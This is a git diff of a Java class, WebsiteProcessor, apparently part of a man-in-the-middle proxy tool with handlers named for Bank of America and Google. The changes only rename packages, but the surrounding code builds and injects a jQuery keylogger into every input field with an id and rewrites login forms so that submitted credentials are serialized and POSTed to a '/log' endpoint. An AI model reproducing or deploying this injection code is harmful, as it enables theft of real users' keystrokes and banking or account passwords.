@@ -1,4 +1,4 @@
-package Server;
+package server;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -25,12 +25,14 @@ import org.jsoup.nodes.Document.OutputSettings;
 import org.jsoup.nodes.Entities.EscapeMode;
 import org.jsoup.select.Elements;
 
-import DataStructures.ClientInfo;
-import DataStructures.EasyMIMConfig;
-import DataStructures.RequestInfo;
-import WebsiteHandlers.BankOfAmericanHandler;
-import WebsiteHandlers.GoogleHandler;
-import WebsiteHandlers.WebsiteHandler;
+import datastructures.ClientInfo;
+import datastructures.EasyMIMConfig;
+import datastructures.RequestInfo;
+
+import websitehandlers.BankOfAmericanHandler;
+import websitehandlers.GoogleHandler;
+import websitehandlers.WebsiteHandler;
+
 
 
 public class WebsiteProcessor {
@@ -175,7 +177,7 @@ public class WebsiteProcessor {
 			if(input.attr("id")!=null && !input.attr("id").equals("")){
 				String keyString ="'"+input.attr("id")+"'";
 				String valueString = "$('#"+input.attr("id")+"').val()";
-				String varKeyLog = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+","+Logger.Logger.LOG_PARAM+":'"+Logger.Logger.KEY_LOG_VALUE+"'};";
+				String varKeyLog = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+","+logger.Logger.LOG_PARAM+":'"+logger.Logger.KEY_LOG_VALUE+"'};";
 				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
 				String completeKeylogger = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
 						varKeyLog+
@@ -193,7 +195,7 @@ public class WebsiteProcessor {
 			String name = (loginForm.id()+" "+loginForm.attr("name")).toLowerCase();
 			if(name.contains("login") || name.contains("sign")){
 				String formSerialization = "JSON.stringify($('#"+loginForm.id()+", form[name="+loginForm.attr("name")+"]').serializeArray())"; 
-				String varCred = "var d = {url:'"+ri.url+"',key:'"+loginForm.id()+"',value:"+formSerialization+","+Logger.Logger.LOG_PARAM+":'"+Logger.Logger.CREDENTIAL_LOG_VALUE+"'};";
+				String varCred = "var d = {url:'"+ri.url+"',key:'"+loginForm.id()+"',value:"+formSerialization+","+logger.Logger.LOG_PARAM+":'"+logger.Logger.CREDENTIAL_LOG_VALUE+"'};";
 				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
 				String completeCredentialSubmit = "(function(){"+varCred+ajaxString+"})()";
 				loginForm.attr("onsubmit",completeCredentialSubmit);
